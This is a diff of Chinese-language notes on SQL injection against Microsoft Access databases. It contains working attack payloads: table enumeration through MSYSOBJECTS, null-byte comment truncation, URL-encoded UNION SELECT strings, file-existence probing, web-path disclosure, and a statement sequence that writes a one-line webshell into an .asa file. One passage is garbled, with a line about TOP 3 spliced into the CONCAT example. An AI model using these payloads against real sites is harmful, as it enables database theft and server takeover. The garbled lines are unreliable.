@@ -1,27 +1,23 @@
-Access数据库由六种对象组成：表Table、查询Query、窗体Form、报表Report、Macro、Module。Form类似于phpMyadmin。宏和模块1是外部批处理（函数），模块更加复杂，module可以使用vb进行编程。
-支持ODBC（开发数据库互联，Open DataBase Connectivity）：可以将位图、声音、excel、word嵌入数据库。
 
-ACCESS的SQL查询窗口不支持注释。 由于   access   所使用的JETSQL只支持单句JETSQL语句，并且程序流控制有VBA来控制，因此查询中一般不需要注释，因而没有注释字符（其实可以使用%00也就是空字符NULL来对传给服务器的时候起到作用，虽然字符串类型还是会加上引号），你可以将注释写在VBA中。可想而知配备的服务器是iis。
 只有access才需要猜表和列，其他的可以直接爆出来
-
-
-SELECT name FROM MSYSOBJECTS WHERE TYPE=1 AND NAME NOT LIKE 'Msys*'可以知道所有表名，但是MSYSOBJECTS不能web访问
-表名字最好用[]括起来，免的是保留字（好像name什么的就是）
-
-不支持limit，因为UNION SELECT TOP 3 AttrName FROM vali
-不支持CONCAT()函数. 可以使用"&"或"+"操作来俩接两个字符串.在使用的时侯必须对这两个操作符进行URLencode编码:' UNION SELECT 'web' %2b 'app' FROM validTableName%00 : 返回"webapp"dTableName: 这条语句返回(前)3 行
-
-MID()子串函数
-LEN()长度函数
-可以使用IIF()函数. 语法 : IIF(condition, true, false) 。起到if的作用
-
-
-
 暴WEB路径：可以通过对一个不存在的库进行SELECT操作.Access将会回应一条包含有完整路径的错误信息
 验证文件是否存在：UNION SELECT name FROM msysobjects IN '\boot.ini'%00 : (如果文件存在)将会获得一条错误信息:it informs that the database format was not recognized.
 输出一句话木马：
 create table cmd (a varchar(50))
 insert into cmd (a) values ('一句话木马代码') 
-select * into [a] in 'e:\web\webshellcc\1.asa;x.xls' 'excel 4.0;' from cmd
+select * into [a] from cmd  in 'e:\web\webshellcc\1.asa;x.xls' 'excel 4.0;' 
 drop table cmd
-不过其实结合union和第三局select就够了
+
+
+
+
+
+SELECT name FROM MSYSOBJECTS WHERE TYPE=1 AND NAME NOT LIKE 'Msys*'可以知道所有表名，但是MSYSOBJECTS不能web访问
+表名字最好用[]括起来（mysql中使用``），免的是保留字（好像name什么的就是）
+
+ACCESS的SQL查询窗口单行JETSQL且不支持注释。并且程序流控制有VBA来控制，因此查询中一般不需要注释，因而没有注释字符（其实可以使用%00也就是空字符NULL来对传给服务器的时候起到作用，虽然字符串类型还是会加上引号），你可以将注释写在VBA中。可想而知配备的服务器是iis。
+不支持limit，因为UNION SELECT TOP 3 AttrName FROM vali
+不支持CONCAT()函数. 可以使用"&"或"+"操作来俩接两个字符串.在使用的时侯必须对这两个操作符进行URLencode编码:' UNION SELECT 'web' %2b 'app' FROM validTableName%00 : 返回"webapp"dTableName: 这条语句返回(前)3 行
+
+
+
